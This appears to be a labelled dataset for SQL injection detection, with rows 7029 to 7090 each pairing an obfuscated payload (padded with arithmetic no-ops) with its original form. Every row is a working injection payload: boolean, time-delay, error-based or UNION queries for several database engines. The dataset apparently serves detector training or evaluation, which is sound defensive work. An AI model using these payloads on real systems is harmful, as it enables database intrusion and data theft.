,Query,Label,Original
7029,"1' where  0+1230+2*3-6=0+8-8+1230+2/2-1+2*3-6+2/2-1 Or 2*3-6 Or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83   0+0+0+)+8-8+2*3-6=SIN(0)+regexp_substring+0+0  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ",1,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
7030,"select * from generate_series  (  9964,9964,case when   (   8-8+9964+8-8=0+4455+8-8+SIN(0)  )   then 1 else 0 end  )   limit 1-- ",1,"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--"
7031,select case when  8-8+6662+2*3-6+8-8+2/2-1=2*3-6+9889+2/2-1 then 1 else null end-- ,1,select case when 6662  =  9889 then 1 else null end--
7032,1   )    )    as xoch where  8-8+8765+SIN(0)=8765+2/2-1+SIN(0)+SIN(0) aNd 1 And  0+3754+2*3-6+8-8=0+2/2-1+(  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  oR 2*3-6 ||  (  select   (  case when   (   SIN(0)+2*3-6+2*3-6+3754+SIN(0)=8-8+3754+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- ,1,1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --
7033,select   (  case when   (   0+2/2-1+6045+8-8+8-8+8-8=2/2-1+2*3-6+2786+0+2/2-1  )   then 6045 else 1/  (  select 0  )   end  )  -- ,1,select   (  case when   (  6045  =  2786  )   then 6045 else 1/  (  select 0  )   end  )  --
7034,1'  )   and 1 aND  7533+SIN(0)+8-8=2/2-1+7533+0+2*3-6+0 and   (   0+0+8-8+2*3-6+0+'cryr'=SIN(0)+2*3-6+'cryr ,1,1'  )   and 7533  =  7533 and   (  'cryr'  =  'cryr
7035,"1  )   aNd 1 and elt  (   8-8+2*3-6+3138+SIN(0)=1817,1817+8-8+8-8  )   ",1,"1  )   and elt  (  3138  =  1817,1817  )  "
7036,-2214'  )   union all select 8228# ,1,-2214'  )   union all select 8228#
7037,if  (   2*3-6+4194+0+0+2/2-1=SIN(0)+4133+2/2-1+0+2/2-1  )   select 4194 else drop function tqhz-- ,1,if  (  4194  =  4133  )   select 4194 else drop function tqhz--
7038,"1   )    )     )   aND 1 And 1 aND  2*3-6+SIN(0)+8148+2*3-6+2*3-6+0=SIN(0)+2/2-1+2/2-1+0+like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
7039,"1'  )   AND 1 aNd  2*3-6+4241+SIN(0)+2*3-6=8-8+SIN(0)+SIN(0)+convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   8-8+4241+SIN(0)+0=0+2/2-1+4241+8-8+0  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (   0+2/2-1+'qtfl'=8-8+2/2-1+0+'qtfl+0+8-8 ",1,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'qtfl'  =  'qtfl"
7040,"1 or 2*3-6 Or SIN(0) || 2/2-1 ||  2*3-6+8-8+8-8+7552+SIN(0)+0=(+2*3-6+2*3-6  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza ",1,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza"
7041,-4873'   )    )     )   Or SIN(0) || 8-8 || SIN(0) or  SIN(0)+8-8+0+3038+2*3-6+2/2-1=2*3-6+3038+SIN(0)+0+0+2*3-6 ,1,-4873'   )    )     )   or 3038  =  3038
7042,1'  )   as njfg where  6392+2/2-1+8-8+SIN(0)+0=8-8+6392+8-8+0 waitfor delay '0:0:5'-- ,1,1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--
7043,1' aND 1 aND  7533+0+2/2-1+2/2-1=2/2-1+SIN(0)+SIN(0)+7533+SIN(0) and  8-8+'jwgc'+0+2/2-1=0+8-8+0+'jwgc+8-8+8-8 ,1,1' and 7533  =  7533 and 'jwgc'  =  'jwgc
7044,select   (  case when   (   2/2-1+2132+SIN(0)=8-8+8969+SIN(0)+8-8  )   then 1 else 2132*  (  select 2132 from master..sysdatabases  )   end  )  -- ,1,select   (  case when   (  2132  =  8969  )   then 1 else 2132*  (  select 2132 from master..sysdatabases  )   end  )  --
7045,"1'   )    )     )   oR 8-8 or SIN(0) Or  1022+0+0+8-8=0+8-8+8-8+(  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ",1,"1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
7046,"1'  )    (  select   (  case when   (   SIN(0)+8-8+5451+2*3-6+2/2-1=5451+SIN(0)+8-8+2/2-1  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   And 1 aND   (  'vjnf' like 'vjnf ",1,"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'vjnf' like 'vjnf"
7047,"-2359' union all select 2687,2687,2687# ",1,"-2359' union all select 2687,2687,2687#"
7048,1  )   where  0+2/2-1+8-8+8-8+2940+0=0+0+8-8+8-8+2940+2/2-1 ,1,1  )   where 2940  =  2940
7049,"1 ""  )   as yggn where  SIN(0)+0+1006+SIN(0)=0+SIN(0)+1006+8-8+SIN(0)+SIN(0) procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (   5840+0+2/2-1=2/2-1+5840+0  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- ",1,"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --"
7050,-4184'   )    )     )   or 8-8 Or  2/2-1+SIN(0)+2579+SIN(0)+0=2*3-6+2/2-1+4654+2/2-1+0+8-8 #,1,-4184'   )    )     )   or 2579  =  4654#
7051,"1  )   where  8338+2/2-1+8-8+2/2-1+SIN(0)=8-8+0+8338+2/2-1 And 1 and  2*3-6+SIN(0)+6055=ctxsys.drithsx.sn+2*3-6+2/2-1+2*3-6+8-8+0  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  OR 2/2-1 or  (  select   (  case when   (   2*3-6+2*3-6+2/2-1+2/2-1+6055=6055+2*3-6+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- ",1,"1  )   where 8338  =  8338 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"
7052,"1%'   )    )     )   aND 1 aNd row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   SIN(0)+6237+0=8-8+6237,1+2/2-1+SIN(0)+SIN(0)+2*3-6   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (   0+0+2*3-6+2*3-6+0+'%'=2*3-6+2*3-6+' ",1,"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '%'  =  '"
7053,"1'||  (  select 'qued' where  2*3-6+2/2-1+9801+SIN(0)=9801+2*3-6+SIN(0) procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  # ",1,"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
7054,"1%'   )    )    oR 2/2-1 oR 2/2-1 oR  8-8+SIN(0)+6979=8-8+8-8+SIN(0)+SIN(0)+like+SIN(0)  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ",1,"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"
7055,"1 ""  )   as kzuq where  SIN(0)+4259+8-8=2/2-1+SIN(0)+4259+0 ",1,"1""  )   as kzuq where 4259  =  4259"
7056,"1 ""  )   and 1 aND char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85   0+2/2-1+)=2/2-1+SIN(0)+0+regexp_substring+8-8  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (   ""lsca "" like  ""lsca ",1,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca"
7057,1' in boolean mode  )   aND 1 and   (   8-8+SIN(0)+8610+2*3-6+2*3-6+0=8-8+2985+SIN(0)+8-8  )  *2985# ,1,1' in boolean mode  )   and   (  8610  =  2985  )  *2985#
7058,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   aNd 1 AND    (    (     (   SIN(0)+8-8+'npzh'=SIN(0)+'npzh+SIN(0)+2/2-1+0+8-8 ,1,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh
7059,"1%'   )    )    union all select null,null,null,null,null,null,null# ",1,"1%'   )    )    union all select null,null,null,null,null,null,null#"
7060,"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911# ",1,"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#"
7061,"1'   )    )    as ewsw where  2*3-6+2*3-6+SIN(0)+0+4667+2/2-1=8-8+4667+2/2-1+2/2-1+SIN(0)+0 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  # ",1,"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
7062,waitfor delay '0:0:5' and 1 aND 'fjpf' like 'fjpf ,1,waitfor delay '0:0:5' and 'fjpf' like 'fjpf
7063,1'   )    )    AND 1 aNd 1 AND sleep  (  5  )   and    (    (    0+8-8+'tcwt'+2*3-6=8-8+8-8+'tcwt+2/2-1+0+2/2-1 ,1,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt
7064,"1 "" where  3434+2*3-6+SIN(0)+2*3-6+SIN(0)=2*3-6+0+0+3434+SIN(0) ",1,"1"" where 3434  =  3434"
7065,"1'   )    )     )   and 1 AND 1 And make_set  (   SIN(0)+9514+2*3-6=8-8+8668,8668+SIN(0)+2*3-6  )   and    (    (     (  'sgjj' like 'sgjj ",1,"1'   )    )     )   and make_set  (  9514  =  8668,8668  )   and    (    (     (  'sgjj' like 'sgjj"
7066,"-7036%' oR SIN(0) OR 0 oR SIN(0) OR  0+8-8+5023=8-8+ctxsys.drithsx.sn+8-8  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   2/2-1+2/2-1+5023+2*3-6+2/2-1+8-8=SIN(0)+5023+2*3-6+SIN(0)+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   And 1 and 1 &&  SIN(0)+'%'+8-8=2/2-1+'+2*3-6+SIN(0)+SIN(0) ",1,"-7036%' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '"
7067,-9893' OR 2/2-1 || 2*3-6 OR  2*3-6+2/2-1+4747+2/2-1=2*3-6+2/2-1+dbms_utility.sqlid_to_sqlhash+2/2-1   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   2*3-6+4747+8-8=8-8+4747+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aNd 1 And  2*3-6+0+2/2-1+2/2-1+'pbop'=2/2-1+'pbop+8-8 ,1,-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop
7068,"1   )    )    as xvyi where  2*3-6+0+6701+8-8+8-8=6701+2/2-1+8-8+0+2/2-1+2/2-1 union all select null,null,null,null# ",1,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#"
7069,"-7006' where  2/2-1+2/2-1+6966+0+2*3-6=0+6966+SIN(0) union all select 6966,6966,6966,6966# ",1,"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#"
7070,"1' where  8083+2*3-6+2*3-6=2/2-1+8-8+2/2-1+8083+8-8 aND 1 && 1 And updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (   8-8+3393+8-8=0+0+0+3393,1+2/2-1   )    )     )  ,0x717a767a71  )  ,1161  )  -- ",1,"1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --"
7071,"1'   )    )    aNd 1 aND updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (   3393+2*3-6+8-8=2/2-1+3393,1+0   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (    SIN(0)+2/2-1+'vedm'+SIN(0)+0+SIN(0)=8-8+2/2-1+0+'vedm ",1,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'vedm'  =  'vedm"
7072,1' rlike   (  select   (  case when   (   2/2-1+8-8+7689=2/2-1+8-8+7689+0+2*3-6  )   then 1 else 0x28 end   )    )    aNd 1 And 'hyun' like 'hyun ,1,1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun
7073,select   (  case when   (   0+4393+2*3-6+2/2-1=2875+8-8+SIN(0)+2*3-6+2*3-6  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  -- ,1,select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --
7074,"-1915% ""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732# ",1,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#"
7075,"1'  )   and 1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   2/2-1+6237+8-8=0+6237,1+2*3-6   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (   2/2-1+SIN(0)+2*3-6+'qbdm'=8-8+8-8+'qbdm+SIN(0)+8-8 ",1,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm"
7076,1'+  (  select byor where  2*3-6+2*3-6+4538+2/2-1+0=2*3-6+8-8+4538 ,1,1'+  (  select byor where 4538  =  4538
7077,"-3059 OR SIN(0) Or  SIN(0)+8-8+8-8+1570+SIN(0)+SIN(0)=2/2-1+0+convert+2/2-1+0  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   1570+2*3-6+2/2-1+SIN(0)=SIN(0)+8-8+1570+8-8+2*3-6+2*3-6  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   ",1,"-3059 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  "
7078,1' oR SIN(0) Or 0 or 0 OR sleep  (  5  )  ,1,1' or sleep  (  5  ) 
7079,select   (  case when   (   8113+2/2-1+SIN(0)+2*3-6=0+0+8981+SIN(0)+2/2-1+2/2-1  )   then 8113 else 1/  (  select 0  )   end  )  -- ,1,select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --
7080,1%'   )    )    and 1 AND  8-8+0+0+3754+2*3-6=(+8-8+2/2-1+SIN(0)  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  oR SIN(0) OR  (  select   (  case when   (   2*3-6+3754+2*3-6=8-8+0+3754+8-8  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (    2*3-6+2/2-1+'%'='+2*3-6+0 ,1,1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  '
7081,"1'||  (  select 'wvio' from dual where  2*3-6+8934+SIN(0)+0+SIN(0)=0+2*3-6+0+8934+0 and 1 AND  2/2-1+0+8-8+8312+SIN(0)+2*3-6=2*3-6+dbms_pipe.receive_message+8-8  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  -- ",1,"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"
7082,"1'  )   aND 1 && 1 And  6510+SIN(0)+2/2-1=(+8-8+0  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   ",1,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  "
7083,"1'  )   where  SIN(0)+7279+2/2-1+2*3-6+0=2/2-1+7279+0+0 aND 1 aND  0+8-8+8189+0+2/2-1+0=0+SIN(0)+(+2*3-6+2*3-6  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- ",1,"1'  )   where 7279  =  7279 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
7084,"1 ""  )   where  SIN(0)+0+2/2-1+2016+2*3-6+2*3-6=0+2016+2*3-6+SIN(0) And 1 AND   (   SIN(0)+0+SIN(0)+1547=8-8+2093+SIN(0)+8-8  )  *2093-- ",1,"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--"
7085, (   8-8+2/2-1+2*3-6+2/2-1+8362+2/2-1=8-8+9139+SIN(0)  )  *9139 ,1, (  8362  =  9139  )  *9139
7086,-6567'   )    )    union all select 3217# ,1,-6567'   )    )    union all select 3217#
7087,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  # ",1,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"
7088,"1' OR 8-8 OR  2/2-1+2/2-1+4411+SIN(0)+2*3-6=SIN(0)+SIN(0)+(+2*3-6  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   And 1 aND  2*3-6+'ebuo'+8-8+0+SIN(0)=SIN(0)+'ebuo+SIN(0)+2/2-1 ",1,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'ebuo'  =  'ebuo"
7089,"1% ""  )   aND 1 aNd  SIN(0)+2*3-6+7756+2*3-6+8-8+SIN(0)=SIN(0)+dbms_utility.sqlid_to_sqlhash+8-8+0+0   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  Or 0 oR  (  select   (  case when   (   2*3-6+SIN(0)+0+7756+SIN(0)=7756+8-8+SIN(0)+2/2-1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (   ""% "" 8-8+2/2-1+2*3-6++0+SIN(0)=SIN(0)+2/2-1++2/2-1 "" ",1,"1%""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """
7090,"1% ""  )   || 2/2-1 or 0 OR 2*3-6 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   8-8+9173+2/2-1+0=SIN(0)+9173,1+SIN(0)+2*3-6+2/2-1+8-8   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   aND 1 aNd   (   ""% "" 8-8++8-8=2*3-6++0 "" ",1,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """
